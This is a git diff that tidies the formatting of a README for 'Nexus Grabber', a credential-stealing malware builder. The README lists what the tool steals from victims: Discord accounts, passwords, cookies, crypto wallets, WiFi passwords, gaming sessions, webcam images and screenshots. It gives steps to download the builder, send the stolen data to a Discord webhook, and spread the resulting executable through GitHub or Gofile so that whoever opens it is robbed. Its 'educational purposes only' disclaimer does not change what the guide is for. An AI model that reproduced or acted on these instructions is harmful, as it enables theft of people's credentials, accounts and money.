@@ -8,71 +8,69 @@
   <a href="#"><img src="https://img.shields.io/badge/downloads-8.2k-purple?style=for-the-badge"></a>
 </p>
 
-
-
 ## Features
 
 - **System Info**
   - Computer Name
   - Computer OS
-  - Total memory
+  - Total Memory
   - UUID
-  - Cpu
-  - Gpu
-  - Product key
+  - CPU
+  - GPU
+  - Product Key
 
-- **System Info**
+- **Network Info**
   - IP
   - Region
   - Country
   - Timezone
-  - Celular network
-  - Proxy/Vpn
+  - Cellular Network
+  - Proxy/VPN
   - Reverse DNS
 
-
-  
-- **Grabbed info**
-  - Discord account
+- **Grabbed Info**
+  - Discord Account
   - Passwords
   - Cookies
   - History
   - Autofills
-  - Roblox cookies
-  - Telegram sessions
-  - Common files
+  - Roblox Cookies
+  - Telegram Sessions
+  - Common Files
   - Wallets
-  - Wifi passwords
+  - WiFi Passwords
   - Webcam
-  - Minecraft sessions
-  - Epic game sessions
-  - Steam session
-  - Uplay session
+  - Minecraft Sessions
+  - Epic Game Sessions
+  - Steam Session
+  - Uplay Session
   - Growtopia Session
   - Screenshot
-  - System info
+  - System Info
 
 ## Installation
 
-1. Download the latest release from the [Releases]([https://github.com/your-username/bloom-exploit/releases](https://github.com/OFBloom4345/Nexus-grabber/releases/tag/Executor)) page.
+1. Download the latest release from the [Releases](https://github.com/OFBloom4345/Nexus-grabber/releases/tag/Executor) page.
 2. Extract the downloaded ZIP file.
-3. Run `Start.bat` "It will ask you for a password.
+3. Run `Start.bat` (It will ask you for a password).
 
-## Creating a webhook
-1.Make a server 
-2.Go to Server settings,integration,create webhook
-3.Copy Webook url
+## Creating a Webhook
+
+1. Make a server.
+2. Go to Server Settings > Integration > Create Webhook.
+3. Copy the Webhook URL.
 
 ## Usage
 
-1. Launch Start.bat again.
-2. Paste in your Webook url
+1. Launch `Start.bat` again.
+2. Paste in your Webhook URL.
 3. Check the desired settings.
-4. Press create
+4. Press Create.
 
-## Usage use github or gofile to distribute the exe
-1. When someone opens it it will give you the information
-   
+## Distribution
+
+Use GitHub or Gofile to distribute the executable.
+
 ## Contributing
 
 We welcome contributions! To contribute:
@@ -88,7 +86,7 @@ This project is licensed under the [MIT License](LICENSE).
 
 ## Disclaimer
 
-Nexus Grabber is intended for educational purposes only. Use it responsibly and comply with Discords terms of service.
+Nexus Grabber is intended for educational purposes only. Use it responsibly and comply with Discord's terms of service.
 
 ---
 
